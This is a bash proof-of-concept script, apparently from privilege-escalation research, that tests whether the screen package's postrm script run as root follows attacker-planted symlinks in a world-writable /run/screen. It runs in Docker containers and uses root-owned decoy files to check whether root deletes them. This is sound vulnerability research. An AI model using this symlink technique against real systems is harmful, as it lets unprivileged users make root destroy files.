#!/usr/bin/env bash
set -euo pipefail

target_container="${1:-ubuntu24-server-lpe-target}"
image="${2:-ubuntu24-server-default-lpe:20260516-standard}"
probe_container="screen-postrm-probe-$$"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/screen-postrm-remove.out"
tmp_log="$(mktemp "$repo_dir/logs/screen-postrm-remove.out.tmp.XXXXXX")"

{
  echo "## target default proof"
  docker exec "$target_container" sh -lc '
set +e
sed -n "1,8p" /etc/os-release
id attacker
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" screen 2>&1
stat -Lc "%A %a %U:%G %F %n" /run/screen /var/run/screen /var/lib/dpkg/info/screen.postinst /var/lib/dpkg/info/screen.postrm 2>&1
echo "### postinst"
nl -ba /var/lib/dpkg/info/screen.postinst | sed -n "1,60p"
echo "### postrm"
nl -ba /var/lib/dpkg/info/screen.postrm | sed -n "1,40p"
runuser -u attacker -- bash -lc "id; touch /run/screen/attacker-default-write-test 2>&1; ls -la /run/screen/attacker-default-write-test 2>&1; rm -f /run/screen/attacker-default-write-test"
'

  echo
  echo "## destructive postrm test in disposable clone"
  docker rm -f "$probe_container" >/dev/null 2>&1 || true
  docker run --name "$probe_container" "$image" bash -lc '
set +e
id attacker >/dev/null 2>&1 || useradd -m -u 1001 attacker
echo "### clone package and scripts"
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" screen 2>&1
stat -Lc "%A %a %U:%G %F %n" /var/lib/dpkg/info/screen.postrm /var/lib/dpkg/info/screen.postinst 2>&1
nl -ba /var/lib/dpkg/info/screen.postrm | sed -n "1,30p"

echo "### attacker populates sticky /run/screen"
mkdir -p /run/screen
chown root:utmp /run/screen 2>/dev/null || chown root:root /run/screen
chmod 1777 /run/screen
mkdir -p /root/screen-postrm-dir
printf ROOT_DECOY > /root/screen-postrm-decoy
printf ROOT_NESTED > /root/screen-postrm-dir/nested
runuser -u attacker -- bash -lc "
set +e
id
mkdir -p /run/screen/S-attacker
printf ATTACKER_FILE > /run/screen/attacker-file
ln -s /root/screen-postrm-decoy /run/screen/root-file-link
ln -s /root/screen-postrm-dir /run/screen/root-dir-link
mkfifo /run/screen/attacker-fifo
find /run/screen -maxdepth 2 -printf \"%M %u:%g %p -> %l\n\" | sort
"

echo "### root screen.postrm remove"
/var/lib/dpkg/info/screen.postrm remove
postrm_rc=$?
echo postrm_rc=$postrm_rc

echo "### result"
test -e /root/screen-postrm-decoy && echo DECOY_FILE_OK || echo DECOY_FILE_LOST
test -e /root/screen-postrm-dir/nested && echo DECOY_DIR_OK || echo DECOY_DIR_LOST
test -e /run/screen && echo RUN_SCREEN_STILL_EXISTS || echo RUN_SCREEN_REMOVED
find /root/screen-postrm-dir -maxdepth 1 -printf "%M %u:%g %p\n" 2>&1 || true
'
  docker rm -f "$probe_container" >/dev/null 2>&1 || true
} >"$tmp_log" 2>&1

mv "$tmp_log" "$log_path"
sed -n '1,360p' "$log_path"
